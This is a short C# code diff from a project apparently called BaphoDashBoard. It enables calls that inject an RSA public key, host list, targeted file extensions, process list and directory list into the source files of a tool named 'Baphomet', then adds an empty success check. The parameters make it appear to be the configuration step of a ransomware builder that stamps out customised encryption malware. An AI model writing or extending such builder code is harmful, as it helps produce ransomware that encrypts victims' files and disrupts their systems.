@@ -213,11 +213,17 @@ namespace BaphoDashBoard.DAL.Services
                 var main_path = getpath.Remove(getpath.Length - 15);
                 main_path = Path.Combine(main_path, "Tools","Baphomet");
 
-                //var draw_rsa_key = DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
-                //var draw_host_list = DrawParameters(Path.Combine(main_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
-                //var draw_extensions = DrawParameters(Path.Combine(main_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
-                //var draw_processes = DrawParameters(Path.Combine(main_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
-                //var draw_dirs = DrawParameters(main_path, "Program.cs", "<dirs list here>", model);
+                var draw_rsa_key = DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", "<public key here>", model);
+                var draw_host_list = DrawParameters(Path.Combine(main_path, "Utilities"), "NetInfo.cs", "<host list here>", model);
+                var draw_extensions = DrawParameters(Path.Combine(main_path, "Utilities"), "Crypt.cs", "<extensions list here>", model);
+                var draw_processes = DrawParameters(Path.Combine(main_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
+                var draw_dirs = DrawParameters(main_path, "Program.cs", "<dirs list here>", model);
+
+                if(draw_rsa_key.Result.success == true)
+                {
+
+                }
+              
             }
             catch(Exception ex)
             {
